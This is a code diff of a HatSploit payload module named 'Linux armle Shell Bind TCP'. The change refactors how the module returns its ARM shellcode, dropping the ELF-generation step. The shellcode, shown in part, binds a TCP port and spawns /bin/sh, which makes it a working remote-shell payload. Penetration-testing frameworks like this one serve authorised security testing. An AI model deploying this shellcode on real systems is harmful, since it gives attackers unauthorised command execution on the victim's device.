@@ -5,11 +5,10 @@
 # Current source: https://github.com/EntySec/HatSploit
 #
 
-from hatvenom import HatVenom
 from hatsploit.lib.payload import Payload
 
 
-class HatSploitPayload(Payload, HatVenom):
+class HatSploitPayload(Payload):
     details = {
         'Category': "stager",
         'Name': "Linux armle Shell Bind TCP",
@@ -39,11 +38,7 @@ class HatSploitPayload(Payload, HatVenom):
     def run(self):
         bind_port = self.parse_options(self.options)
 
-        offsets = {
-            'bport': bind_port
-        }
-
-        shellcode = (
+        return (
             b"\x01\xe0\x8f\xe2"
             b"\x1e\xff\x2f\xe1"
             b"\x02\x20\x01\x21"
@@ -67,7 +62,6 @@ class HatSploitPayload(Payload, HatVenom):
             b"\x01\x01\x01\x01"
             b"\x2f\x62\x69\x6e"
             b"\x2f\x73\x68\x58"
-        )
-
-        payload = self.generate('elf', 'armle', shellcode, offsets)
-        return payload
+        ), {
+            'bport': bind_port
+        }
